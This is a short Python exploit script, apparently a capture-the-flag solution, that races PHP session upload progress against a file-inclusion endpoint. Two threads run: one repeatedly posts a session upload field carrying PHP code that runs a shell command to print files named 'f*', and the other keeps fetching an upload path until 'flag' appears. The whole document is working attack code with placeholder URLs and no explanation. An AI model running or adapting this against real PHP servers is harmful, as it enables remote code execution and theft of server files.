import requests
import threading

session = requests.session()
sess = 'yu22x'
url1 = "fdfd"
url2 = "fdfd/upload"
data1={
    'PHP_SESSION_UPLOAD_PROGRESS':'<?php system("tac ../f*"); ?>'
}
file={
    'file':'yu22x'
}
cookies={
    'PHPSESSID':sess
}

def write():
    while True:
        r = session.post(url1,data=data1,files=file,cookies=cookies)
def read():
    while True:
        r = session.get(url2)
        if 'flag' in r.text:
            print(r.text)

threads = [threading.Thread(target=write),threading.Thread(target=read)]
for t in threads:
    t.start()


















